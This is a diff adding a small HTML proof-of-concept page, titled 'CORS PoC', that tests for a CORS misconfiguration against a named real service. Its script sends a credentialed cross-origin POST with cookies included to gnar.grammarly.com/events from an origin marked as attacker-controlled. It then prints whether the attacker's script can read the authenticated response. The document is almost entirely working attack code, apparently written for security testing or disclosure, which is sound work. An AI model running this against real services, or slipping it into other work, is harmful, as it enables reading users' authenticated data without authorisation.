@@ -1,0 +1,37 @@
+<!doctype html>
+<html>
+<body>
+<h1>CORS PoC</h1>
+<pre id="result">Testing...</pre>
+
+<script>
+(async () => {
+  try {
+    const r = await fetch("https://gnar.grammarly.com/events", {
+      method: "POST",
+      mode: "cors",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        test: "cors-poc",
+        marker: "attacker-controlled-origin"
+      })
+    });
+
+    const body = await r.text();
+
+    document.getElementById("result").textContent =
+      "Status: " + r.status + "\n" +
+      "Response readable by attacker JS: YES\n\n" +
+      body;
+
+  } catch (e) {
+    document.getElementById("result").textContent =
+      "CORS blocked/error:\n" + e;
+  }
+})();
+</script>
+</body>
+</html>
